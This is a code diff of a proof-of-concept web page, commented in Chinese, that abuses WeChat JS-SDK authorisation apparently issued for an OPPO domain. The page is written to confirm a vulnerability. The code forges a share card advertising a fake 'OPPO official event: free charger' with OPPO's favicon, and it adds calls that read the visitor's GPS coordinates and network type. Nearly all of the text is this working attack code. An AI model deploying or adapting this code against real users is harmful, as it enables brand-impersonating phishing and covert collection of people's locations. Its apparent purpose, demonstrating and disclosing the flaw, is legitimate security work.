@@ -25,44 +25,52 @@
         timestamp: d.timestamp,
         nonceStr: d.nonceStr,
         signature: d.signature,
-        jsApiList: ['updateAppMessageShareData', 'onMenuShareTimeline']
+        jsApiList: [
+          'updateAppMessageShareData',
+          'onMenuShareTimeline',
+          'getLocation',
+          'getNetworkType'
+        ]
       });
 
-     wx.ready(function() {
+      wx.ready(function() {
+        document.getElementById('result').innerText = '✅ wx.ready() 触发 — 漏洞确认';
 
-  // 1. 伪造分享卡片
-  wx.updateAppMessageShareData({
-    title: 'OPPO官方活动：领取免费充电器',
-    desc: '点击参与，限时免费',
-    link: 'https://tscanner9.github.io/poc/',
-    imgUrl: 'https://supervooc.oppo.cn/favicon.ico',
-    success: function() {
-      document.getElementById('result').innerText += '\n✅ 分享卡片伪造成功';
-    }
-  });
+        // 1. 伪造分享卡片
+        wx.updateAppMessageShareData({
+          title: 'OPPO官方活动：领取免费充电器',
+          desc: '点击参与，限时免费',
+          link: 'https://tscanner9.github.io/poc/',
+          imgUrl: 'https://supervooc.oppo.cn/favicon.ico',
+          success: function() {
+            document.getElementById('result').innerText += '\n✅ 分享卡片伪造成功';
+          }
+        });
 
-  // 2. 获取地理位置
-  wx.getLocation({
-    type: 'wgs84',
-    success: function(res) {
-      document.getElementById('result').innerText
-        += '\n✅ 获取位置成功: ' + res.latitude + ',' + res.longitude;
-    }
-  });
+        // 2. 获取地理位置
+        wx.getLocation({
+          type: 'wgs84',
+          success: function(res) {
+            document.getElementById('result').innerText
+              += '\n✅ 获取位置成功: ' + res.latitude + ',' + res.longitude;
+          },
+          fail: function(err) {
+            document.getElementById('result').innerText
+              += '\n❌ 位置获取失败: ' + err.errMsg;
+          }
+        });
 
-  // 3. 获取网络状态
-  wx.getNetworkType({
-    success: function(res) {
-      document.getElementById('result').innerText
-        += '\n✅ 网络类型: ' + res.networkType;
-    }
-  });
-
-});
+        // 3. 获取网络状态
+        wx.getNetworkType({
+          success: function(res) {
+            document.getElementById('result').innerText
+              += '\n✅ 网络类型: ' + res.networkType;
+          }
+        });
+      });
 
       wx.error(function(err) {
-        document.getElementById('result').innerText
-          = '❌ wx.error: ' + err.errMsg;
+        document.getElementById('result').innerText = '❌ wx.error: ' + err.errMsg;
       });
     });
   </script>
